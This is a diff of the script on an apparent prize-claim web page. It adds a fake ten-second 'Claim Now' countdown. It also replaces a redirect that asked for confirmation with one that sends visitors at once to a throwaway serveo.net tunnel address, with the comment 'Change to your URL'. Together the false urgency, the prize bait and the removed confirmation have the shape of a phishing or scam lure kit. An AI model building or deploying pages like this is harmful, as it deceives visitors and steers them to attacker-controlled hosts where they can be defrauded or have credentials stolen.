@@ -54,29 +54,25 @@
         <a href="#" class="button" id="claimBtn">Claim Now</a>
     </div>
 
-    <script>
-        // Countdown Timer
-        let timeLeft = 10;
-        function updateCountdown() {
-            document.getElementById("countdown").innerText = "00:" + (timeLeft < 10 ? "0" + timeLeft : timeLeft);
-            timeLeft--;
-            if (timeLeft < 0) {
-                document.getElementById("countdown").innerText = "EXPIRED";
-                document.getElementById("claimBtn").style.pointerEvents = "none";
-                document.getElementById("claimBtn").style.opacity = "0.5";
-            }
+  <script>
+    // Countdown Timer
+    let timeLeft = 10;
+    function updateCountdown() {
+        document.getElementById("countdown").innerText = "00:" + (timeLeft < 10 ? "0" + timeLeft : timeLeft);
+        timeLeft--;
+        if (timeLeft < 0) {
+            document.getElementById("countdown").innerText = "EXPIRED";
+            document.getElementById("claimBtn").style.pointerEvents = "none";
+            document.getElementById("claimBtn").style.opacity = "0.5";
         }
-        setInterval(updateCountdown, 1000);
+    }
+    setInterval(updateCountdown, 1000);
 
-        // Redirect with Confirmation
-        document.getElementById("claimBtn").addEventListener("click", function(event) {
-            event.preventDefault();
-            let confirmWin = confirm("Are you sure you want to claim your prize?");
-            if (confirmWin) {
-                window.location.href = "https://4cec2359c44fe71d411826c001932361.serveo.net"; // Change to your URL
-            }
-        });
-    </script>
-
+    // Redirect Without Confirmation
+    document.getElementById("claimBtn").addEventListener("click", function(event) {
+        event.preventDefault();
+        window.location.href = "https://63544b485984303cf32369db2dd6da91.serveo.net"; // Change to your URL
+    });
+</script>
 </body>
 </html>
